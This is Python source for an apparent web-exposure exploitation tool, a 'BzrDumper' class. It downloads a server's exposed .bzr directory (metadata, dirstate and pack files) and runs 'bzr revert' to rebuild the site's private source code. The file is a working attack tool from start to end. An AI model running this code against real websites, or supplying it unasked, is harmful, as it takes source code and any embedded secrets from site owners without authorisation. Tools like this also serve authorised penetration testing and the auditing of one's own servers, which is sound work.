"""Bazaar (.bzr) repository leak exploiter."""

import asyncio
import logging
import os
from pathlib import Path

from rich.console import Console

from fileleak.core.base import BaseDumper

logger = logging.getLogger(__name__)
console = Console()


class BzrDumper(BaseDumper):
    """Bazaar (.bzr) repository leak exploiter.

    Downloads the exposed .bzr directory, parses checkout/dirstate to
    discover tracked files, downloads pack files from repository/packs/,
    and optionally runs ``bzr revert`` to restore the working tree.
    """

    BZR_FILES = [
        "README",
        "branch-format",
        "branch/branch.conf",
        "branch/format",
        "branch/last-revision",
        "branch/tags",
        "checkout/conflicts",
        "checkout/dirstate",
        "checkout/format",
        "checkout/views",
        "repository/format",
        "repository/pack-names",
        "repository/indices",
        "repository/upload",
        "locks",
    ]

    def __init__(self, url: str, **kwargs):
        super().__init__(url, **kwargs)
        self.base_url = self._normalize_url(url)

    async def start(self):
        """Download .bzr metadata and attempt recovery."""
        console.print("[bold magenta][BzrDumper][/bold magenta] Starting Bazaar leak exploitation")

        # 1. Download metadata files
        await self._download_metadata()

        # 2. Parse dirstate for file list
        files = await self._parse_dirstate()
        if files:
            console.print(f"[green]Found {len(files)} tracked file(s) in dirstate[/green]")
        else:
            console.print("[yellow]No tracked files discovered from dirstate[/yellow]")

        # 3. Try to download pack files
        await self._download_packs()

        # 4. Try bzr revert if available
        await self._try_revert()

        stats = self.get_stats()
        console.print(
            f"[bold magenta][BzrDumper][/bold magenta] Done. "
            f"Downloaded: {stats['downloaded']}, "
            f"Failed: {stats['failed']}, "
            f"Skipped: {stats['skipped']}"
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _download_metadata(self):
        """Download all known .bzr metadata files."""
        console.print("[bold magenta][BzrDumper][/bold magenta] Downloading metadata files...")
        tasks = [
            self.download(f"{self.base_url}/{f}", f".bzr/{f}")
            for f in self.BZR_FILES
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _parse_dirstate(self) -> list[str]:
        """Parse .bzr/checkout/dirstate for tracked files.

        Bazaar dirstate is a text-based format with null-separated fields.
        The header contains format version and parent revision info.
        Each entry line uses ``\\x00`` (null) as field separator.

        Entry format (simplified)::

            \\x00<directory>\\x00<filename>\\x00<file-id>\\x00...

        We combine *directory* and *filename* to form the full path.
        """
        dirstate_path = os.path.join(
            self.output_dir, ".bzr", "checkout", "dirstate"
        )
        if not os.path.isfile(dirstate_path):
            return []

        try:
            with open(dirstate_path, "rb") as f:
                raw = f.read()
        except OSError as exc:
            logger.warning(f"Failed to read dirstate: {exc}")
            return []

        if not raw:
            return []

        files: list[str] = []
        seen: set[str] = set()

        # Split into lines and parse each entry
        for line in raw.split(b"\n"):
            if not line:
                continue
            # Fields are separated by null bytes
            parts = line.split(b"\x00")
            # Filter out empty parts
            parts = [p for p in parts if p]

            # We need at least 2 non-empty fields (directory + filename)
            # The typical structure after filtering empties:
            #   [state_info, directory, filename, file_id, ...]
            # The directory and filename are what we need.
            # Look for the pattern where we have enough fields
            if len(parts) < 2:
                continue

            # Skip header lines (first line typically has format info)
            try:
                # Try to identify directory and filename fields
                # In Bazaar dirstate, entries have the form:
                #   \x00<dir>\x00<name>\x00<fileid>\x00...
                # After splitting and filtering, we look for path components
                # that look like filenames (not binary hash data)
                directory = None
                filename = None
                for i, part in enumerate(parts):
                    try:
                        text = part.decode("utf-8")
                    except UnicodeDecodeError:
                        continue
                    # Skip parts that look like header/format info
                    if text.startswith("#") or text.startswith("Bazaar"):
                        continue
                    # First decodeable non-header field is likely directory
                    if directory is None:
                        directory = text
                    elif filename is None:
                        filename = text
                        break

                if directory is not None and filename is not None:
                    if directory:
                        full_path = f"{directory}/{filename}"
                    else:
                        full_path = filename
                    # Skip if it looks like a header/format marker
                    if full_path not in seen and not full_path.startswith("#"):
                        seen.add(full_path)
                        files.append(full_path)
            except Exception:
                continue

        logger.debug(f"dirstate parsed: {len(files)} file(s)")
        return files

    async def _download_packs(self):
        """Try to download pack files referenced in pack-names.

        The ``repository/pack-names`` file lists pack file hashes, one per
        line.  The actual packs are stored under ``repository/packs/`` with
        the hash as filename and ``.pack`` suffix.
        """
        pack_names_path = os.path.join(
            self.output_dir, ".bzr", "repository", "pack-names"
        )
        if not os.path.isfile(pack_names_path):
            return []

        try:
            with open(pack_names_path, "rb") as f:
                raw = f.read()
        except OSError as exc:
            logger.warning(f"Failed to read pack-names: {exc}")
            return []

        pack_hashes: list[str] = []
        for line in raw.splitlines():
            name = line.decode("utf-8", errors="replace").strip()
            if name:
                pack_hashes.append(name)

        if not pack_hashes:
            return []

        console.print(
            f"[bold magenta][BzrDumper][/bold magenta] "
            f"Downloading {len(pack_hashes)} pack file(s)..."
        )

        tasks: list[asyncio.Task] = []
        # Download .pack and .idx files from packs/ directory
        for pack_hash in pack_hashes:
            for suffix in (".pack", ".idx"):
                url = f"{self.base_url}/repository/packs/{pack_hash}{suffix}"
                local = f".bzr/repository/packs/{pack_hash}{suffix}"
                tasks.append(asyncio.ensure_future(self.download(url, local)))

        await asyncio.gather(*tasks, return_exceptions=True)
        return pack_hashes

    async def _try_revert(self):
        """Try to run ``bzr revert`` if bazaar is installed."""
        bzr_dir = os.path.join(self.output_dir, ".bzr")
        if not os.path.isdir(bzr_dir):
            return

        try:
            proc = await asyncio.create_subprocess_exec(
                "bzr", "revert",
                cwd=self.output_dir,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await asyncio.wait_for(proc.wait(), timeout=60)
            if proc.returncode == 0:
                console.print("[green]bzr revert succeeded[/green]")
            else:
                logger.debug("bzr revert returned non-zero exit code")
        except FileNotFoundError:
            logger.debug("bzr not found, skipping revert")
        except asyncio.TimeoutError:
            logger.debug("bzr revert timed out")
        except Exception as exc:
            logger.debug(f"bzr revert failed: {exc}")

    # ------------------------------------------------------------------
    # URL normalization
    # ------------------------------------------------------------------

    @staticmethod
    def _normalize_url(url: str) -> str:
        """Ensure the URL points to the ``.bzr`` directory."""
        url = url.rstrip("/")
        if url.endswith(".bzr"):
            return url
        if "/.bzr" not in url:
            url = url + "/.bzr"
        return url
